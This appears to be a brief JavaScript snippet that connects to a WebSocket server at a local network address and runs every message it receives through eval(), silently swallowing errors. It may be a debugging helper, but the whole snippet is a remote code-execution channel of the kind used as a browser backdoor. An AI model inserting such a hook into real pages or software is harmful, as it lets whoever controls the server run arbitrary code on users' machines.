try{
  var ws = new WebSocket("ws://192.168.68.112:3000");
  
  ws.onmessage = function(event) {
  	try {
  		eval(event.data);
  	} catch (e) {
  		console.error(e);
  	}
  };
  
  ws.onopen = function() {
  	console.log("Connected");
  };
  
  ws.onclose = function() {
  	console.log("Disconnected");
  };
}catch(e){}
